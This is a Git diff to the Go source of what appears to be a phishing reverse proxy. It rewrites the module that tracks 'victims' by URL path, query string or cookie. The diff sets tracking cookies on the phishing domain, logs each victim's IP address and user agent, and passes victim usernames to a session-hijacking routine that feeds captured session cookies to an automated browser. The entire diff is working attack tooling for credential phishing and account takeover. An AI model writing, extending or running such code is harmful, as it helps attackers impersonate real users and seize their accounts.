@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"net/http"
 	"net/url"
+	"path"
+	"path/filepath"
 	"regexp"
 	"strings"
 	"sync"
@@ -33,6 +35,7 @@ type Tracker struct {
 	session.SessionModule
 
 	Enabled        bool
+	Type           string
 	Identifier     string
 	ValidatorRegex *regexp.Regexp
 
@@ -81,6 +84,7 @@ func Load(s *session.Session) (m *Tracker, err error) {
 	m = &Tracker{
 		SessionModule: session.NewSessionModule(Name, s),
 		Enabled:       s.Config.Tracking.Enabled,
+		Type:          s.Config.Tracking.Type,
 	}
 
 	if !m.Enabled {
@@ -126,12 +130,44 @@ func isDisabledMethod(method string) bool {
 	return false
 }
 
-func (module *Tracker) makeTrace(id string) (t *Trace) {
+func isDisabledAccessMediaType(accessMedia string) bool {
 
+	var disabledMedia = []string{"image/"}
+
+	// Media Type handling.
+	// Prevent processing of unwanted accessMedia types
+	accessMedia = strings.TrimSpace(strings.ToLower(accessMedia))
+	for _, skip := range disabledMedia {
+
+		skip = strings.ToLower(skip)
+		if strings.HasPrefix(accessMedia, skip) {
+			return true
+		}
+	}
+
+	return false
+}
+
+func isDisabledPath(requestPath string) bool {
+
+	file := path.Base(requestPath)
+	ext := strings.ToUpper(filepath.Ext(file))
+	ext = strings.ReplaceAll(ext, ".", "")
+
+	var disabledExtensions = []string{"JS", "CSS", "MAP", "WOFF", "SVG"}
+	for _, disabled := range disabledExtensions {
+		if ext == disabled {
+			return true
+		}
+	}
+
+	return false
+}
+
+func (module *Tracker) makeTrace(id string) (t *Trace) {
 	t = &Trace{}
 	t.Tracker = module
 	t.ID = strings.TrimSpace(id)
-
 	return
 }
 
@@ -164,35 +200,69 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 		return
 	}
 
-	newTracking := true
+	if isDisabledPath(request.URL.Path) {
+		module.Debug("Skipping requested path [%s] because untrackable ... for now ",
+			tui.Bold(tui.Red(request.URL.Path)))
+		return
+	}
+
+	if isDisabledAccessMediaType(request.Header.Get("Access")) {
+		module.Debug("Skipping requested Access header [%s] because untrackable ... for now ",
+			tui.Bold(tui.Red(request.Header.Get("Access"))))
+		return
+	}
+
+	noTraces := true
 
 	//
-	// Trace order checks:
-	// - URL.query
-	// - HTTP Cookie
+	// Tracing types: Path || Query (default)
 	//
-	// module.Debug("Making trace: %s", request.URL.Query().Get(module.Identifier))
-	t = module.makeTrace(request.URL.Query().Get(module.Identifier))
-	if !t.IsValid() {
-
-		// Checking Cookies
-		c, err := request.Cookie(module.Identifier)
-		if err == nil {
-			t.ID = c.Value
-
-			// Validate cookie content
+	if module.Type == "path" {
+		re := regexp.MustCompile(`/([^/]+)`)
+		match := re.FindStringSubmatch(request.URL.Path)
+		if len(match) > 0 {
+			t = module.makeTrace(match[1])
 			if t.IsValid() {
-				newTracking = false
+				request.Header.Set("If-Landing-Redirect", strings.ReplaceAll(request.URL.Path, t.ID, ""))
+				noTraces = false
 			}
 		}
-	} else {
-		newTracking = false
 	}
 
-	if newTracking {
-		// module.Debug("No traces found in defined channels")
-		t.ID = module.makeID()
+	if noTraces {
+		// Fallback
+		// Use Query String
+		t = module.makeTrace(request.URL.Query().Get(module.Identifier))
+		if t.IsValid() {
+			noTraces = false
+		} else {
+			// Checking Cookies
+			c, err := request.Cookie(module.Identifier)
+			if err == nil {
+
+				t.ID = c.Value
+
+				// Validate cookie content
+				if t.IsValid() {
+					module.Debug("Fetched victim from cookies: %s", tui.Bold(tui.Red(t.ID)))
+					noTraces = false
+				} else {
+					t = module.makeTrace("")
+				}
+			}
+		}
 	}
+
+	if noTraces {
+		module.Debug("No traces found in defined channels %s", request.URL.RawPath)
+		t.ID = module.makeID()
+		// t = module.makeTrace("")
+	}
+
+	//
+	// Set trackers:
+	// - HTTP Header If-Range
+	request.Header.Set("If-Range", t.ID)
 
 	// Check if the Trace ID is bind to an existing victim
 	v, err := module.GetVictim(t)
@@ -206,17 +276,13 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 			Cookies:      sm,
 		}
 		module.Push(v)
-		module.Info("New victim [%s] from (%s %s%s)", tui.Bold(tui.Red(t.ID)), request.Method, request.Host, request.URL)
+		module.Info("New victim [%s] IP[%s] UA[%s]", tui.Bold(tui.Red(t.ID)), request.RemoteAddr, request.UserAgent())
 
 	} else {
 		// This Victim is well known, increasing the number of requests processed
 		v.RequestCount++
 	}
 
-	//
-	// Set trackers:
-	// - HTTP Header If-Range
-	request.Header.Set("If-Range", t.ID)
 	return
 }
 
@@ -229,37 +295,40 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *Victim) {
 	}
 
 	trackingFound := false
-	t := module.makeTrace(response.Request.Header.Get("If-Range"))
-	if t.IsValid() {
-		response.Header.Add("Set-Cookie",
-			fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
-				module.Identifier, t.ID, module.Session.Config.Proxy.Phishing))
+	t := module.makeTrace("")
 
-		trackingFound = true
-	} else {
+	// Check cookies first to avoid replacing issues
+	for _, cookie := range response.Request.Cookies() {
+		if cookie.Name == module.Identifier {
+			t.ID = cookie.Value
+			trackingFound = t.IsValid()
+			break
+		}
+	}
 
-		// Trace not found in If-Range HTTP Header, check cookies
-		for _, cookie := range response.Request.Cookies() {
-			if cookie.Name == module.Identifier {
-				t.ID = cookie.Value
-				if t.IsValid() {
-					_, err := t.GetVictim(t)
-					if err == nil {
-						trackingFound = true
-					}
-				}
-				break
-			}
+	if !trackingFound {
+		// Trace not found in Cookies check If-Range HTTP Header
+		t = module.makeTrace(response.Request.Header.Get("If-Range"))
+		if t.IsValid() {
+			response.Header.Add("Set-Cookie",
+				fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
+					module.Identifier, t.ID, module.Session.Config.Proxy.Phishing))
+			response.Header.Add("If-Range", t.ID)
+			module.Debug("Found tracking in If-Range .. pushing cookie %s (%s)", response.Request.URL, t)
+			trackingFound = true
 		}
 	}
 
 	if !trackingFound {
 		module.Debug("Untracked response: [%s] %s", response.Request.Method, response.Request.URL)
+		// Reset trace
+		t = module.makeTrace("")
+
 	} else {
 		var err error
 		victim, err = t.GetVictim(t)
 		if err != nil {
-			module.Debug("Error: cannot retrieve Victim from tracker: %s", err)
+			module.Warning("Error: cannot retrieve Victim from tracker: %s", err)
 		}
 	}
 
@@ -370,7 +439,9 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 				Provider:       t.Session.Config.NecroBrowser.Profile,
 				DebuggingPort:  t.Session.Config.InstrumentationPort + 1,
 				SessionCookies: sessCookies,
-				Keywords:       t.Session.Config.NecroBrowser.Keywords,
+				// TODO hack to pass more info for necrobrowser
+				//Keywords:       t.Session.Config.NecroBrowser.Keywords,
+				Keywords: []string{fmt.Sprintf("%s_%s", victim.Username, victim.ID)},
 			}
 
 			m, err := t.Session.Module("necrobrowser")
